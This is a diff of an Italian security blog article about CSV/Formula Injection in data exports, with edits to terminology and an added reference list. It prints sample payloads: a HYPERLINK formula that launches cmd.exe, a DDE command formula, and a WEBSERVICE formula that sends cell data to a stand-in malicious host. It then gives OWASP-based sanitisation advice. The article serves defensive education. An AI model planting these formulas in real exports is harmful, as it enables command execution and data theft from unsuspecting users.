@@ -1,8 +1,10 @@
+
 **Comma Separated Victims (sottotitolo:  Attenti alla Formula!)**
+*autore: Simone Cinti - Gennaio 2021*
 
 Quante volte ti è capitato di aver a che fare con l'export dei dati in formato CSV?
 Diverse volte, suppongo.
-Sei consapevole dei rischi a cui potresti andare incontro sottovalutando alcune vulnerabilità nello sviluppo di una componente per l'export dei dati in formato CSV, che potrebbero consentire una serie di attacchi quali  **Remote Code Execution**  o **Data Breach**?
+Sei consapevole dei rischi a cui potresti andare incontro sottovalutando alcune vulnerabilità nello sviluppo di una componente per l'export dei dati in formato CSV, che potrebbero consentire una serie di attacchi quali  **Remote Command Execution**  e **Data Breach**?
 Se non hai mai sentito parlare di **Injection** e, più precisamente di **Formula Injection** o di **CSV Injection**,  allora questo articolo farà certamente al caso tuo.
 
 Nel mio [precedente articolo](https://techblog.smc.it/it/2020-06-19/injection-attacks-how-to-prevent-with-liferay) su questo techblog avevo già illustrato come gli attacchi di tipo Injection possono rappresentare un serio rischio per la sicurezza dei tuoi dati, e come prevenirli con Liferay.
@@ -27,7 +29,7 @@ In particolare, potremmo inserire nel campo note in input la sequenza:
 
     =COLLEG.IPERTESTUALE("C:\Windows\System32\cmd.exe";"Apri la pagina web")
 
-per generare in output un CSV che nella cella corrispondente avrà un valore che se cliccato dall'utente consentirà l'esecuzione (previa conferma da parte dell'utente) del comando al percorso indicato. Nell'esempio aprirà il prompt dei comandi sulla macchina della vittima; in questo modo l'attaccante è riuscito a sfruttare un attacco **Formula Injection** per ottenere l'esecuzione (**Remote Code Execution**) di un comando del Sistema Operativo. 
+per generare in output un CSV che nella cella corrispondente avrà un valore che se cliccato dall'utente consentirà l'esecuzione (previa conferma da parte dell'utente) del comando al percorso indicato. Nell'esempio aprirà il prompt dei comandi sulla macchina della vittima; in questo modo l'attaccante è riuscito a sfruttare un attacco **Formula Injection** al fine di ottenere poi l'esecuzione di un comando del Sistema Operativo (**Remote Command Execution** o più propriamente **OS Command Injection**)
 
 Allarmante, vero?
 
@@ -47,14 +49,14 @@ Qualora la vittima utilizzasse invece versioni precedenti della suite Office opp
 
     =cmd|'/K echo INJECTION'!A0
 
-Attacchi di questo tipo mediante **Formula Injection** sono dunque degli stratagemmi per arrivare ad altre tipologie di attacchi ben più pericolosi quali l'esecuzione di un comando o di una applicazione (**Remote Code Execution** o **Arbitrary Code Execution**) in modo indesiderato.
+Attacchi di questo tipo mediante **Formula Injection** sono dunque degli stratagemmi per arrivare ad altre tipologie di attacchi ben più pericolosi quali **l'esecuzione di un comando** del Sistema Operativo o di una applicazione in modo indesiderato.
 
-Dal momento che si accennava agli hyperlink, un attaccante potrebbe sfruttare un attacco di tipo **Formula Injection** anche per l'invocazione di servizi web malevoli mediante la funzione per l'invocazione dei servizi web. 
+Dal momento che si accennava agli hyperlink, un attaccante potrebbe sfruttare un attacco di questo tipo anche per l'invocazione di servizi web malevoli mediante la funzione per l'invocazione dei servizi web. 
 Ad esempio un attaccante potrebbe sfruttare la vulnerabilità per iniettare una formula che possa invocare un servizio web a sua scelta al fine di ricevere i dati presenti nelle colonne C6, C7 e C8 . L'utente ignaro di tutto potrebbe involontariamente invocare una HTTP Request verso il servizio malevolo:
 
     =SERVIZIO.WEB(CONCATENA("http://service.malware?d="; C6&","&C7&","&C8))
 
-passando nel parametro "d" i dati che desidera, sfruttando così un attacco **Formula Injection** ai fini di un **Data Breach** .
+passando nel parametro "d" i dati che desidera, sfruttando così l'attacco **Formula Injection** ai fini di un **Data Breach** .
 
 Arrivati a questo punto ti starai chiedendo quali sono le strategie utili a neutralizzare questo tipo di attacchi.
 
@@ -70,4 +72,11 @@ In accordo con quanto [consigliato da **OWASP**](https://owasp.org/www-community
 Ovviamente ciò non ci renderà immuni da quell'utente che decida arbitrariamente di modificare il valore della cella eliminando il carattere apostrofo.
 In tal caso potremmo adottare strategie più o meno restrittive o invasive di sanitizzazione al fine di proteggere anche gli utenti più *intraprendenti* da se stessi.
 
+Per ulteriori approfondimenti:
+- https://payatu.com/csv-injection-basic-to-exploit
+- https://labs.bishopfox.com/tech-blog/2018/06/server-side-spreadsheet-injections
+- https://owasp.org/www-community/attacks/CSV_Injection
+- https://cwe.mitre.org/data/definitions/1236.html
+- https://docs.microsoft.com/it-it/office/troubleshoot/excel/security-settings
+- https://techblog.smc.it/it/2020-06-19/injection-attacks-how-to-prevent-with-liferay
  
